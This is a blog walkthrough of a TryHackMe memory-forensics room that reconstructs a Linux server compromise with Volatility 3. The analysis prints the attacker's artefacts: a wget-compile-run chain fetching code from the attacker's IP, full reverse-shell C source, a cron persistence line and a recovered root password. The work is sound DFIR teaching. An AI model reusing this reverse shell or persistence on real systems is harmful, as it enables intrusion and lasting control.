---
title: "TryHackMe Profiles: Linux memory forensics with Volatility 3"
date: 2026-11-10T12:39:00+05:30
lastmod: 2026-11-10T12:39:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-profiles/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - DFIR
  - memory forensics
  - Volatility 3
  - LiME
  - Linux
  - incident response
  - reverse shell

draft: false
description: "TryHackMe Profiles walkthrough: Linux memory forensics with Volatility 3, recovering bash history, network sockets, page cache files and ext4 inodes from a LiME dump"
---

A medium-difficulty DFIR challenge: a database server was compromised, and the incident response team captured a LiME memory dump before the attacker could finish cleaning up. The task is to reconstruct the attack timeline from that single 4 GB memory image. If you enjoyed the log-based rooms in the SOC Level 2 path, this one is a step up because the evidence lives in volatile memory, not in a SIEM index.

## Task 1: The Incident

The room provides a single evidence ZIP containing `linux.mem`, a LiME-format memory dump from an Ubuntu 20.04 server (kernel `5.4.0-166-generic`, hostname `dbserver`, user `paco`). All six questions target artefacts that a real responder would extract during triage: credentials, file timestamps, malware hashes, network connections, and persistence mechanisms.

### Setting up Volatility 3

The room links Sean Whalen's guide for installing Volatility 3, which is the recommended tool. The critical step most walkthroughs skip: Volatility 3 Linux plugins need an ISF (Intermediate Symbol Format) file matching the target kernel. Without it every `linux.*` plugin fails with "Unsatisfied requirement".

The ISF for `5.4.0-166-generic` is in the [Abyss-W4tcher volatility3-symbols](https://github.com/Abyss-W4tcher/volatility3-symbols) repository:

```
Ubuntu/amd64/5.4.0/166/generic/Ubuntu_5.4.0-166-generic_5.4.0-166.183_amd64.json.xz
```

Drop it into `volatility3/symbols/linux/` and the scanner picks it up automatically.

{{< ad >}}

### Q1: What is the exposed root password?

The `linux.bash.Bash` plugin recovers command history from all bash processes in memory:

```
vol -f linux.mem linux.bash.Bash
```

One entry stands out:

```
1076  bash  2023-11-07 03:49:45  su rootFtrccw45PHyq
```

The user typed `su root` and the password on the same line (a common terminal artefact when the password prompt arrives before the newline is flushed). The 12-character root password is visible in the clear.

**Answer: REDACTED** (12 characters)

### Q2: When was users.db approximately accessed?

The bash history shows PID 1076 (paco's shell) ran `sqlite3 users.db` at timestamp `#1699328985`, which converts to `2023-11-07 03:49:45 UTC`. This is the time the attacker opened the database.

The filesystem access time from `linux.pagecache.Files` shows an earlier value (`03:42:22`) because the system uses `relatime` and the atime was already newer than the mtime, so sqlite3 did not update it. The room accepts the bash history timestamp as the approximate access time.

**Answer: REDACTED** (YYYY-MM-DD HH:MM:SS)

### Q3: What is the MD5 hash of the malicious file?

The bash history reveals the attack chain:

```
wget 10.0.2.72/shell.c && gcc shell.c -o pkexecc && rm shell.c
./pkexecc
```

The attacker downloaded C source for a reverse shell, compiled it as `pkexecc` (named to look like the legitimate `pkexec` polkit binary), deleted the source, then ran the binary. The kernel log confirms it:

```
process 'pkexecc' launched '/bin/sh' with NULL argv: empty string added
```

The source code is still in memory (the HTTP response was cached):

```c
  #include <sys/types.h>
  #include <sys/socket.h>
  #define REMOTE_ADDR "10.0.2.72"
  #define REMOTE_PORT 1337
  int main(int argc, char *argv[]) {
      struct sockaddr_in sa;
      int s;
      sa.sin_family = AF_INET;
      sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
      sa.sin_port = htons(REMOTE_PORT);
      s = socket(AF_INET, SOCK_STREAM, 0);
      connect(s, (struct sockaddr *)&sa, sizeof(sa));
      dup2(s, 0); dup2(s, 1); dup2(s, 2);
      execve("/bin/sh", 0, 0);
      return 0;
  }
```

The compiled binary (`16968 bytes`) is recoverable from the page cache. Searching for ELF headers near the `REMOTE_ADDR` string in the raw dump and extracting the correct 16968-byte region yields the file's MD5.

**Answer: REDACTED** (32-character MD5)

### Q4: What is the attacker's IP and port?

The `linux.sockstat.Sockstat` plugin shows all active sockets. The reverse shell connection is unmistakable:

```
sh   1093  FD=0  AF_INET  TCP  10.0.2.73:41012  10.0.2.72:1337  ESTABLISHED
su   1095  FD=0  AF_INET  TCP  10.0.2.73:41012  10.0.2.72:1337  ESTABLISHED
bash 1097  FD=0  AF_INET  TCP  10.0.2.73:41012  10.0.2.72:1337  ESTABLISHED
```

The `pkexecc` binary connected out to `10.0.2.72` on port `1337`. The socket was inherited by `su` and then `bash` as the attacker escalated to root through the reverse shell.

The same IP also shows up in sshd logs as the source of all SSH sessions, confirming this is the attacker's machine.

**Answer: REDACTED** (IP:Port)

### Q5: Cronjob file path and inode

The `linux.pagecache.Files` plugin lists every file cached in the kernel's page cache, complete with inode numbers and timestamps:

```
131127  REG  /var/spool/cron/crontabs/root  40 bytes
  Access: 2023-11-07 03:51:30  Modify: 2023-11-07 03:51:30
```

The syslog also flagged this crontab:

```
Nov 7 03:52:01 cron[653]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
```

The answer combines the full path with the inode number.

**Answer: REDACTED** (path:inode)

### Q6: What command is in the cronjob?

The bash history shows the attacker writing the crontab entry:

```
echo '* * * * * cp /opt/.bashrc /root/.bashrc' >> /var/spool/cron/crontabs/root
```

This cron job runs every minute and overwrites root's `.bashrc` with a copy from `/opt/.bashrc`. This is a persistence mechanism: even if an administrator restores the legitimate `.bashrc`, the cron job silently replaces it within 60 seconds. The malicious `.bashrc` in `/opt/` likely contains additional payloads or environment modifications the attacker wants to survive cleanup.

**Answer: REDACTED** (the crontab entry)

## Takeaways

1. Linux memory forensics with Volatility 3 is powerful but the symbol table requirement is a hard gate. Without the matching ISF for the target kernel, no Linux plugin runs at all. Bookmark the Abyss-W4tcher repository or build your own ISFs with `dwarf2json` for the kernels in your environment before you need them.

2. The `linux.pagecache.Files` plugin is the unsung hero of Linux memory analysis. It recovers filenames, full paths, inode numbers, file modes, and all three POSIX timestamps (atime, mtime, ctime) from the kernel's dentry and inode caches. For incident response this often matters more than process listings because it shows what the attacker touched on disk, not just what was running.

Room solved 100%: 1 task, 6 answers.
